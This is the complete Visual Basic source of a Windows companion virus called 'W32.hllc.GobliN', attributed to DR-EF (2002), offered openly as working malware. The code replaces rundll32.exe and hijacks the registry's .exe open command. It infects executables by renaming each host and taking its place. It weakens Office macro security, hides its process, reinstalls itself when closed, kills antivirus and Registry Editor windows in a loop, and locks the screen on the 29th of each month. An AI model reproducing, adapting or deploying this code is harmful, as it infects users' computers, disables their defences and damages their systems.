   '**********************************************************
   'W32.hllc.GobliN by DR-EF (c) 2002 all right reserved !!! *
   'Goblin is a Companion virus infect exe files.the virus   *
   'infect programs when the program run this virus also have*
   'a nice graphical payload.                                *
   '**********************************************************
   Private Declare Function GetCurrentProcessId Lib "kernel32" () As Long
   Private Declare Function RegisterServiceProcess Lib "kernel32" (ByVal dwProcessId As Long, ByVal dwType As Long) As Long
   Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
   Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long
   Private Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
   Private Declare Function TerminateProcess Lib "kernel32" (ByVal hProcess As Long, ByVal uExitCode As Long) As Long
   Private Declare Function PostMessage Lib "user32" Alias "PostMessageA" (ByVal hwnd As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
   Private Declare Function FindWindow Lib "user32" Alias "FindWindowA" (ByVal lpClassName As String, ByVal lpWindowName As String) As Long
   Dim virus_path
   Private Sub Form_Load() 'main of virus:
   Call hide_goblin
   Call get_goblin_path
   Call Disease_effect
   Call payload
   Call infect_file
   If LCase(App.EXEName) = "rundll32" Then
   If App.PrevInstance = True Then End
   Call Protect
   Else
   End
   End If
   End Sub
   Sub payload() 'virus payload:
   On Error Resume Next
   If Day(Date) <> 29 Then Exit Sub
   Dim m, h, t As Boolean
   ShowCursor 0
   Form1.BackColor = vbBlack
   Form1.Label1.ForeColor = vbRed
   Form1.Label1.BackColor = vbbblack
   Load Form1
   Form1.Show
   h = Second(Time) + 5
   m = Second(Time)
   x:
   DoEvents
   If t = False Then
   If m < h Then
   Form1.Label1.FontSize = 45
   Form1.Label1.Caption = ".-=w32.Hllc.GobliN=-." & vbCrLf & _
   "CopyRight To DR-EF" & vbCrLf & "All Right Reseved !!!"
   Label1.ForeColor = vbRed
   m = Second(Time)
   Else
   t = True
   h = Second(Time) + 5
   End If
   Else
   If m < h Then
   Label1.ForeColor = vbYellow
   Form1.Label1.FontSize = 70
   Form1.Label1.Caption = "GobliN VIRUS !!!"
   m = Second(Time)
   Else
   t = False
   h = Second(Time) + 5
   End If
   End If
   If h > 59 Then h = Second(Time) + 5
   If m > 59 Then m = Second(Time)
   Beep
   SendKeys "{Esc}"
   DoEvents
   Form1.SetFocus
   DoEvents
   GoTo x
   End Sub
   Sub Disease_effect() 'virus install:
   On Error Resume Next
   If Dir("c:\windows\Rundll32.GbN", vbHidden) = "" Then
   FileCopy "c:\windows\rundll32.exe", "c:\windows\rundll32.GbN"
   FileCopy virus_path, "c:\windows\Rundll32.exe"
   SetAttr "c:\windows\rundll32.GbN", vbHidden
   SetAttr "c:\windows\rundll32.exe", vbHidden
   End If
   t = Chr(34)
   Open "c:\Goblin_disease.reg" For Output As #1
   Print #1, "REGEDIT4"
   Print #1, ""
   Print #1, "[HKEY_CURRENT_USER\Software\Kazaa\ResultsFilter]"
   Print #1, t & "virus_filter" & t & "=dword:00000000"
   Print #1, ""
   Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced]"
   Print #1, ""
   Print #1, t & "Hidden" & t & "=dword:00000000"
   For i = 8 To 10
   Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\" & i & ".0\Word\Security]"
   Print #1, t & "Level" & "=dword:00000001"
   Print #1, t & "AccessVBOM" & t & "=" & t & "1" & t
   Print #1, t & "DontTrustInstalledFiles" & t & "=dword:00000001"
   Print #1, "[HKEY_CURRENT_USER\Software\Microsoft\Office\" & i & ".0\Excel\Security]"
   Print #1, """Level""=dword:00000001"
   Next i
   Print #1, ""
   Print #1, "[HKEY_CLASSES_ROOT\exefile\shell\open\command]"
   Print #1, "@=" & t & "\" & t & "c:\\windows\\RunDll32.exe\" & _
   t & " %1 %*" & t
   Print #1, "[HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunServices]"
   Print #1, t & "Goblin_By_DR-EF" & t & "=" & t & "c:\\windows\\rundll32.exe" & t
   Close #1
   Dim Reg As Long, RegHandle As Long
   Reg = Shell("regedit /s c:\goblin_disease.reg", vbHide)
   RegHandle = OpenProcess(&H100000, False, Reg)
   Kill "c:\goblin_disease.reg"
   DoEvents
   TerminateProcess RegHandle, 0
   CloseHandle RegHandle
   End Sub
   '***********File Infection Engine*******************
   Sub infect_file() 'stupid code but work good
   On Error GoTo Error
   If LCase(App.EXEName) = "rundll32" Then
   host = Mid(file, 1, Len(file) - 4) & "GbN"
   If Dir(host, vbHidden) = "" Then
   DoEvents
   Name file As host
   FileCopy virus_path, file
   SetAttr host, vbHidden
   Shell host & " " & parm, vbNormalFocus
   Else
   Shell host & " " & parm, vbNormalFocus
   End If
   Else
   host = Mid(virus_path, 1, Len(virus_path) - 3) & "GbN"
   Shell host & " " & parm, vbNormalFocus
   End If
   Exit Sub
   Error:
   Select Case Err.Number
   Case Is = 5
   host = Mid(virus_path, 1, Len(virus_path) - 3) & "GbN"
   Shell host & " " & Command, vbNormalFocus
   Case Is = 75
   Shell Command, vbNormalFocus
   Case Else
   If Command = "" Then Exit Sub
   Shell comamnd, vbNormalFocus
   End Select
   End Sub
   Function parm() As String 'programs parameters:
   For i = 1 To Len(Command)
   If LCase(Right(Left(Command, i), 5)) = ".exe " Then
   parm = Mid(Command, i, Len(Command))
   Exit For
   End If
   Next i
   If parm = "" Then parm = Command
   End Function
   Function file() 'file to run\infect:
   For i = 1 To Len(Command)
   scan = LCase(Mid(Command, 1, i))
   If Right(scan, 5) = ".exe " Then
   s = i
   Exit For
   End If
   Next i
   file = Left(Command, s)
   End Function
   Sub get_goblin_path() 'goblin path:
   If Right(App.Path, 1) = "\" Then
   virus_path = App.Path & App.EXEName & ".exe"
   Else
   virus_path = App.Path & "\" & App.EXEName & ".exe"
   End If
   End Sub
   '***************anti easy remove********************
   Private Sub Form_QueryUnload(Cancel As Integer, UnloadMode As Integer)
   Call Disease_effect
   End Sub
   Private Sub Form_Terminate()
   Call Disease_effect
   End Sub
   Sub hide_goblin()
   Dim Goblin As Long
   Goblin = GetCurrentProcessId
   RegisterServiceProcess Goblin, 1
   App.TaskVisible = False
   Form1.Hide
   End Sub
   Private Sub Form_Unload(Cancel As Integer)
   Call Disease_effect
   End Sub
   Sub Protect()
   If App.PrevInstance = True Then End
   If LCase(App.EXEName) <> "rundll32" Then Exit Sub
   x:
   DisableAV "AVP Monitor"
   DisableAV "AntiViral Toolkit Pro"
   DisableAV "vsstat"
   DisableAV "Iomon98"
   DisableAV "Vshwin"
   DisableAV "Anti-virus"
   DisableAV "Esafe"
   DisableAV "F-Secure Anti-Virus"
   DisableAV "antivirus"
   DisableAV "Navapw32"
   DisableAV "Norton AntiVirus"
   DisableAV "Registry Editor"
   DoEvents
   GoTo x
   End Sub
   Sub DisableAV(AV_Window)
   On Error Resume Next
   Dim AvWnd As Long
   AvWnd = FindWindow(vbNullString, AV_Window)
   If AvWnd = 0 Then Exit Sub
   PostMessage AvWnd, &H12, 0, 0
   End Sub
   '****************************************************
